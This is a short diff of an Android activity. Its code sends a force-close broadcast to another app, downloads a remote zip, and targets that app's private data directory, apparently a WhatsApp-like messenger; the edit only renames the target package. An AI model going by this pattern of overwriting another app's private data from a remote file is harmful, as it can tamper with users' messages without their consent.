@@ -265,14 +265,14 @@ public class SecondActivity extends AppCompatActivity {
         
         new Thread(() -> {
             try {
-                Intent stopIntent = new Intent("com.target.app.ACTION_FORCE_CLOSE");
+                Intent stopIntent = new Intent("com.target.app2.ACTION_FORCE_CLOSE");
                 sendBroadcast(stopIntent);
                 Thread.sleep(1000);
 
                 File tempZip = new File(getFilesDir(), "Backup.zip");
                 downloadFileNative(zipUrl, tempZip);
 
-                File targetWhatsappDir = new File("/data/data/com.target.app/"); 
+                File targetWhatsappDir = new File("/data/data/com.target.app2/"); 
 
                 if (targetWhatsappDir.exists()) {
                     runOnUiThread(() -> {
